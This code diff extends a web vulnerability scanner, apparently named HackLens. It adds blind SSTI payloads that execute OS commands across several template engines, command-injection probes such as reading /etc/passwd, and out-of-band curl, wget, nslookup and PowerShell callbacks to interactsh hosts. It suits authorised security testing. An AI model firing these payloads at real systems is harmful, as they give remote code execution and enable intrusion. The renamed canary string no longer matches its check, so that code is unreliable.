@@ -559,10 +559,17 @@ class Logger:
         entry = {"type": vtype, "url": url, "param": param,
                  "detail": detail, "evidence": evidence}
         with self.lock:
-            if vtype == "Reflected XSS":
+            if "Reflected XSS" in vtype:
                 self.xss.append(entry)
-            else:
+            elif "Redirect" in vtype or "redirect" in vtype:
                 self.redirs.append(entry)
+            elif "SSTI" in vtype:
+                self.vulns.append(entry)
+            elif "Command Injection" in vtype:
+                self.vulns.append(entry)
+            else:
+                # fallback — unknown vuln type goes to xss bucket
+                self.xss.append(entry)
 
     def save(self, domain, ts):
         data = {
@@ -570,6 +577,7 @@ class Logger:
             "secrets":               {"total": len(self.findings),  "findings": self.findings},
             "xss":                   {"total": len(self.xss),       "findings": self.xss},
             "redirects":             {"total": len(self.redirs),    "findings": self.redirs},
+            "ssti_ci":               {"total": len(self.vulns),     "findings": self.vulns},
             "information_disclosure":{"total": len(self.info_disc), "findings": self.info_disc},
         }
         jf = self.out_dir / f"secrets_{ts}.json"
@@ -1955,6 +1963,25 @@ class SSTIScanner:
         (317, 213),   # Round 3: 67521
     ]
 
+    # Blind SSTI time-based payloads per engine
+    # Format: (payload_template, engine_hint)
+    # {N} replaced with sleep seconds
+    BLIND_TIME_PAYLOADS = [
+        # Jinja2 / Python — os.system via globals
+        ("{{config.__class__.__init__.__globals__['os'].system('sleep {N}')}}", "Jinja2"),
+        # Twig / PHP
+        ("{{['sleep','{N}']|map('system')|join}}", "Twig"),
+        # Freemarker / Java
+        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep {N}")}', "Freemarker"),
+        # ERB / Ruby
+        ("<%=`sleep {N}`%>", "ERB"),
+        ("<%=system('sleep {N}')%>", "ERB"),
+        # Spring EL
+        ("*{T(java.lang.Runtime).getRuntime().exec('sleep {N}')}", "Spring EL"),
+        # Velocity / Java
+        ("#set($s='')#set($rt=$s.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke($s))#set($e=$rt.exec('sleep {N}'))$e.waitFor()", "Velocity"),
+    ]
+
     # Engine fingerprint: once we know injection works, narrow down engine
     FINGERPRINTS = {
         "Jinja2":     ("{{7*'7'}}", "7777777"),    # Jinja2 repeats string
@@ -2018,20 +2045,20 @@ class SSTIScanner:
                     break
 
             if confirmed_rounds == len(self.TRIPLE_CHECKS):
-                # All 3 rounds confirmed — this is real SSTI
-                # Try to narrow down the engine
                 engine = self._fingerprint_engine(base_url, params, param, engine_hint)
                 self.log.vuln(
-                    "SSTI — Server-Side Template Injection",
+                    "SSTI — Reflected",
                     evidence_url, param,
                     f"Engine: {engine} | All 3 math probes confirmed",
                     f"Verified: {', '.join(evidence_vals)}"
                 )
                 return  # one finding per param is enough
 
+        # Reflected probes found nothing — try blind time-based
+        self._test_blind_ssti(base_url, params, param)
+
     def _fingerprint_engine(self, base_url, params, param, hint):
         """Try to narrow down exact template engine."""
-        # Jinja2 vs Twig: {{7*'7'}} → '7777777' = Jinja2, '49' = Twig
         if "Jinja2" in hint or "Twig" in hint:
             body, _ = self._inject(base_url, params, param, "{{7*'7'}}")
             if "7777777" in body:
@@ -2039,6 +2066,66 @@ class SSTIScanner:
             if body and re.search(r"(?<!\d)49(?!\d)", body):
                 return "Twig (PHP)"
         return hint
+
+    def _blind_time_test(self, base_url, params, param, payload_tmpl, sleep_secs):
+        """
+        Time-based blind SSTI test.
+        Returns True if response is delayed by sleep_secs (with tolerance).
+        """
+        import time
+        payload = payload_tmpl.replace("{N}", str(sleep_secs))
+        # Measure baseline first
+        try:
+            t0 = time.time()
+            self.session.get(base_url, timeout=sleep_secs + 10)
+            baseline = time.time() - t0
+        except Exception:
+            baseline = 1.0
+
+        # Inject payload
+        _, inject_url = self._inject(base_url, params, param, payload)
+        try:
+            t0      = time.time()
+            r = self.session.get(inject_url, timeout=sleep_secs + 15)
+            elapsed = time.time() - t0
+        except Exception:
+            elapsed = 0
+
+        # Must exceed baseline + sleep - tolerance
+        return elapsed >= (baseline + sleep_secs - 1.0)
+
+    def _test_blind_ssti(self, base_url, params, param):
+        """
+        Blind SSTI detection via time-based payloads.
+        Double-verified: sleep 5 then sleep 3.
+        Called only when reflected math probes return no result.
+        """
+        import time
+        for payload_tmpl, engine_hint in self.BLIND_TIME_PAYLOADS:
+            if engine_hint is None:
+                continue  # skip sanity check payload
+
+            # Round 1: sleep 5
+            if not self._blind_time_test(base_url, params, param, payload_tmpl, 5):
+                continue
+
+            # Round 2: sleep 3 (different delay = double verification)
+            if not self._blind_time_test(base_url, params, param, payload_tmpl, 3):
+                continue
+
+            # Both confirmed — report
+            _, evidence_url = self._inject(
+                base_url, params, param,
+                payload_tmpl.replace("{N}", "5")
+            )
+            self.log.vuln(
+                "SSTI — Blind Time-Based",
+                evidence_url, param,
+                f"Engine: {engine_hint} | sleep 5 + sleep 3 both confirmed",
+                f"Payload: {payload_tmpl[:80]} | Blind — no output in response"
+            )
+            return True
+        return False
 
     def scan_urls(self, urls, workers=5):
         tasks = []
@@ -2068,6 +2155,114 @@ class SSTIScanner:
             for fut in as_completed(futs):
                 pass
 
+
+
+# ─────────────────────────────────────────────
+#  INTERACTSH CLIENT
+#  Registers with a public interactsh server,
+#  generates a unique OOB domain, polls for
+#  DNS/HTTP callbacks after injection.
+# ─────────────────────────────────────────────
+
+class InteractshClient:
+    """
+    Lightweight interactsh client for OOB detection.
+
+    Flow:
+      1. register()   → get unique subdomain (e.g. abc123.oast.fun)
+      2. domain       → use in injection payloads
+      3. poll()       → check if any callbacks received
+      4. Each log entry contains: protocol, source IP, raw request
+
+    Public servers (may be slow/down — use self-hosted for reliability):
+      oast.fun, oast.pro, oast.live, oast.site, oast.online
+    """
+
+    PUBLIC_SERVERS = [
+        "oast.fun",
+        "oast.pro",
+        "oast.live",
+        "oast.site",
+    ]
+
+    def __init__(self, server=None):
+        self.server    = server or self.PUBLIC_SERVERS[0]
+        self.domain    = None
+        self.token     = None
+        self.secret    = None
+        self._session  = requests.Session()
+        self._session.headers.update({"User-Agent": "HackLens/3.0.0"})
+
+    def register(self, timeout=10):
+        """Register with interactsh server. Returns True if successful."""
+        import base64, hashlib
+        try:
+            # Generate a random token
+            import secrets as _sec
+            self.token  = _sec.token_hex(20)
+            self.secret = _sec.token_hex(32)
+
+            # Try each public server until one responds
+            for srv in ([self.server] + self.PUBLIC_SERVERS):
+                try:
+                    r = self._session.post(
+                        f"https://{srv}/register",
+                        json={
+                            "public-key":     self.token,
+                            "secret-key":     self.secret,
+                            "correlation-id": self.token[:20],
+                        },
+                        timeout=timeout
+                    )
+                    if r.status_code == 200:
+                        data = r.json()
+                        self.domain = data.get("domain", "")
+                        self.server = srv
+                        if self.domain:
+                            return True
+                except Exception:
+                    continue
+            return False
+        except Exception:
+            return False
+
+    def poll(self, timeout=10):
+        """
+        Poll for received callbacks.
+        Returns list of dicts: [{protocol, source, raw_request}]
+        """
+        if not self.domain or not self.token:
+            return []
+        try:
+            r = self._session.get(
+                f"https://{self.server}/poll",
+                params={
+                    "id":         self.token[:20],
+                    "secret":     self.secret,
+                },
+                timeout=timeout
+            )
+            if r.status_code == 200:
+                data = r.json()
+                items = []
+                for entry in data.get("data", []):
+                    import base64 as _b64
+                    try:
+                        raw = _b64.b64decode(entry).decode("utf-8", errors="replace")
+                    except Exception:
+                        raw = str(entry)
+                    items.append(raw)
+                return items
+        except Exception:
+            pass
+        return []
+
+    def unique_host(self, prefix=""):
+        """Generate a unique subdomain for a specific injection."""
+        import secrets as _sec
+        uid = _sec.token_hex(6)
+        prefix = re.sub(r"[^a-z0-9]", "", prefix.lower())[:8]
+        return f"{prefix}{uid}.{self.domain}" if self.domain else None
 
 
 # ─────────────────────────────────────────────
@@ -2123,7 +2318,7 @@ class CommandInjectionScanner:
         # Unix
         "id",
         "whoami",
-        "echo hacklens_ci_confirmed",
+        "echo hacklens_ci_ok_7x9q",
         "cat /etc/passwd",
         "cat /etc/hostname",
         "uname -a",
@@ -2133,7 +2328,7 @@ class CommandInjectionScanner:
         "printenv",
         # Windows
         "whoami",
-        "echo hacklens_ci_confirmed",
+        "echo hacklens_ci_ok_7x9q",
         "dir",
         "ver",
         "set",
@@ -2141,26 +2336,47 @@ class CommandInjectionScanner:
         "type C:\\Windows\\win.ini",
     ]
 
+
     # Patterns that confirm output-based injection
+    # STRICT — unambiguous command output only, never normal page content
     OUTPUT_PATTERNS = [
-        r"uid=\d+\([^)]+\)",        # id output: uid=33(www-data)
-        r"root:x:0:0",              # /etc/passwd
-        r"hacklens_ci_confirmed",   # our echo canary
-        r"(?:www-data|root|apache|nginx|nobody|daemon)",
-        r"Linux\s+\S+\s+\d+\.\d+", # uname -a
-        r"Windows\s+IP\s+Configuration",  # ipconfig
-        r"Volume\s+in\s+drive",     # dir output
-        r"\[extensions\]",          # win.ini
-        r"PATH=|HOME=|USER=",       # env vars
-        r"(?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s+\w+\s+\d+",  # ls -la date
+        # id command: uid=N(name) gid=N — never on normal web pages
+        r"uid=\d+\([a-z_][a-z0-9_-]*\)\s+gid=\d+",
+        # /etc/passwd — specific colon format with shell path
+        r"root:x:0:0:[^:]*:/root:/bin/",
+        r"www-data:x:\d+:\d+:",
+        # uname -a — kernel version with build number
+        r"Linux\s+\S+\s+\d+\.\d+\.\d+[^\s]*\s+#\d+",
+        # Windows ipconfig
+        r"Windows IP Configuration",
+        # dir — drive letter
+        r"Volume in drive [A-Z] ",
+        r"Directory of [A-Z]:\\\\",
+        # win.ini
+        r"\[extensions\]\s*\r?\n\s*\w+",
+        # env — multiple KEY=value pairs (not single match)
+        r"(?:HOME|SHELL|USER|LOGNAME)=/[^\s]{3,}\n.*(?:HOME|SHELL|USER|LOGNAME)=/",
     ]
+
+    # Echo canary — verified via baseline diff + URL context check
+    CI_CANARY = "hacklens_ci_ok_7x9q"
 
     def __init__(self, log, session, ci_server=""):
         self.log        = log
         self.session    = session
-        self.ci_server  = ci_server   # interactsh/callback server domain
+        self.ci_server  = ci_server
         self.tested     = set()
-        self._baseline_times = {}
+        self._baseline_times     = {}
+        self._baseline_responses = {}
+        # Set up interactsh client if server provided
+        self._interactsh = None
+        if ci_server:
+            ic = InteractshClient(server=ci_server if ci_server else None)
+            if ic.register(timeout=10):
+                self._interactsh = ic
+                log.success(f"Interactsh registered: {ic.domain}")
+            else:
+                log.warn("Interactsh registration failed — OOB detection disabled")
 
     def _get_baseline(self, base_url, params):
         """Measure baseline response time for the URL."""
@@ -2207,31 +2423,101 @@ class CommandInjectionScanner:
         except Exception:
             return False
 
+    def _get_baseline_response(self, base_url):
+        """Fetch clean baseline response to diff against injected responses."""
+        key = f"resp:{base_url}"
+        if hasattr(self, '_baseline_responses') and key in self._baseline_responses:
+            return self._baseline_responses[key]
+        if not hasattr(self, '_baseline_responses'):
+            self._baseline_responses = {}
+        try:
+            r = self.session.get(base_url, timeout=10)
+            self._baseline_responses[key] = r.text
+            return r.text
+        except Exception:
+            self._baseline_responses[key] = ""
+            return ""
+
     def _output_test(self, base_url, params, param, separator):
-        """Test output-based injection. Returns (confirmed, evidence) or (False, '')."""
+        """
+        Test output-based injection.
+
+        FP elimination:
+        1. Fetch baseline response (no injection)
+        2. Inject command
+        3. Pattern must match injected response
+        4. Pattern must NOT match baseline response (new content only)
+        5. Echo canary: check canary appears NEW (not reflected param value)
+
+        Returns (confirmed, evidence) or (False, '').
+        """
+        baseline = self._get_baseline_response(base_url)
+
         for cmd in self.OUTPUT_CMDS:
+            # Build injected payload
             payload = params[param] + separator + cmd
             url     = self._inject_url(base_url, params, param, payload)
             try:
                 r = self.session.get(url, timeout=10)
-                for pat in self.OUTPUT_PATTERNS:
-                    m = re.search(pat, r.text, re.I)
-                    if m:
-                        return True, f"cmd: {cmd} | matched: {m.group(0)[:80]}"
+                body = r.text
             except Exception:
                 continue
+
+            # Special handling for echo canary
+            if cmd == "echo hacklens_ci_confirmed":
+                # Canary must appear in response AND must NOT be present
+                # simply because the param value was reflected.
+                # Check: does the baseline (clean URL) also reflect our canary?
+                # We also check that the canary doesn't appear as part of
+                # the URL parameter reflection (e.g. href="...hacklens_ci_confirmed")
+                if self.CI_CANARY in body and self.CI_CANARY not in baseline:
+                    # Extra: make sure it's not just the URL being reflected
+                    # (canary appears as standalone text, not inside a URL context)
+                    canary_idx = body.find(self.CI_CANARY)
+                    if canary_idx != -1:
+                        surrounding = body[max(0,canary_idx-50):canary_idx+60]
+                        # If canary appears inside href= or URL context → FP (param reflection)
+                        url_ctx = re.search(
+                            r'(?:href|src|url|action|value)=["\']?[^"\'<>]*' + re.escape(self.CI_CANARY),
+                            surrounding, re.I
+                        )
+                        if not url_ctx:
+                            return True, f"cmd: {cmd} | canary confirmed in response (not reflected URL)"
+                continue
+
+            # For all other commands: check output patterns
+            for pat in self.OUTPUT_PATTERNS:
+                try:
+                    m_inject   = re.search(pat, body,     re.I | re.MULTILINE)
+                    m_baseline = re.search(pat, baseline, re.I | re.MULTILINE)
+                    if m_inject and not m_baseline:
+                        # Pattern appears NEW in injected response → real output
+                        return True, f"cmd: {cmd} | matched: {m_inject.group(0)[:80]}"
+                except re.error:
+                    pass
+
         return False, ""
 
-    def _oob_test(self, base_url, params, param, separator, callback):
-        """OOB test via DNS/HTTP callback (requires ci_server)."""
-        import uuid
-        token   = uuid.uuid4().hex[:12]
-        cb_host = f"{token}.{callback}"
-        cmds    = [
+    def _oob_test(self, base_url, params, param, separator, interactsh):
+        """
+        OOB test via interactsh.
+        Injects DNS/HTTP callback payloads, then polls for confirmation.
+        Returns (confirmed, evidence) or (False, "").
+        """
+        import time
+        cb_host = interactsh.unique_host(prefix=param)
+        if not cb_host:
+            return False, ""
+
+        # Inject via multiple techniques
+        cmds = [
             f"nslookup {cb_host}",
-            f"curl http://{cb_host}",
-            f"wget http://{cb_host}",
+            f"curl -s http://{cb_host}",
+            f"wget -q http://{cb_host}",
             f"ping -c 1 {cb_host}",
+            # Windows
+            f"nslookup {cb_host}",
+            f"powershell -c 'Invoke-WebRequest http://{cb_host}'",
         ]
         for cmd in cmds:
             payload = params[param] + separator + cmd
@@ -2240,11 +2526,51 @@ class CommandInjectionScanner:
                 self.session.get(url, timeout=8)
             except Exception:
                 pass
-        # Return token for caller to check against callback server
-        return token
+
+        # Wait for DNS propagation + server processing
+        time.sleep(3)
+
+        # Poll interactsh for callbacks
+        callbacks = interactsh.poll(timeout=10)
+        if callbacks:
+            evidence = f"OOB callback received: {callbacks[0][:120]}"
+            return True, evidence
+
+        # Try once more after another wait
+        time.sleep(5)
+        callbacks = interactsh.poll(timeout=10)
+        if callbacks:
+            evidence = f"OOB callback received: {callbacks[0][:120]}"
+            return True, evidence
+
+        return False, ""
+
+    # Params that are NEVER command injection sinks
+    # They may get reflected in HTML but are never executed
+    CI_SKIP_PARAMS = {
+        # Analytics / tracking — always reflected, never executed
+        'utm_source','utm_medium','utm_campaign','utm_term','utm_content',
+        'utm_id','fbclid','gclid','msclkid','twclid',
+        # Referrer params — reflected in og:url, canonical etc.
+        'ref','referrer','referer','source','from','via',
+        # Pagination / display
+        'page','per_page','limit','offset','sort','order',
+        'tab','view','layout','theme','lang','locale',
+        # Search / filter — text reflected in results page
+        'q','query','search','keyword','filter','tag','category',
+        # Content identifiers
+        'id','slug','post','article','item','product','sku',
+        # Misc non-executable
+        'format','type','currency','country','color','size',
+        'token','nonce','csrf','state','code',
+    }
 
     def _test_param(self, base_url, params, param):
         """Full CI test on one parameter."""
+        # Skip non-CI-sink params
+        if param.lower().rstrip("[]") in self.CI_SKIP_PARAMS:
+            return
+
         dedup = f"ci:{base_url}:{param}"
         if dedup in self.tested:
             return
@@ -2282,15 +2608,23 @@ class CommandInjectionScanner:
                     )
                     return
 
-            # ── Method 3: OOB via interactsh (if server configured) ───
-            if self.ci_server:
-                token = self._oob_test(base_url, params, param, sep, self.ci_server)
-                # Note: OOB results need polling — log the token for manual check
-                # In a full implementation you would poll interactsh API here
-                self.log.info(
-                    f"CI OOB token {token} injected via {repr(sep)} "
-                    f"in {param} — check {token}.{self.ci_server}"
+            # ── Method 3: OOB via interactsh (if configured) ────────
+            if self._interactsh:
+                oob_ok, oob_evidence = self._oob_test(
+                    base_url, params, param, sep, self._interactsh
                 )
+                if oob_ok:
+                    poc_url = self._inject_url(
+                        base_url, params, param,
+                        params[param] + sep + f"nslookup {self._interactsh.domain}"
+                    )
+                    self.log.vuln(
+                        "Command Injection [CONFIRMED - OOB]",
+                        poc_url, param,
+                        f"Separator: {repr(sep)} | Interactsh callback received",
+                        oob_evidence
+                    )
+                    return
 
     def scan_urls(self, urls, workers=3):
         """Scan all URLs — test ALL parameters, none skipped."""
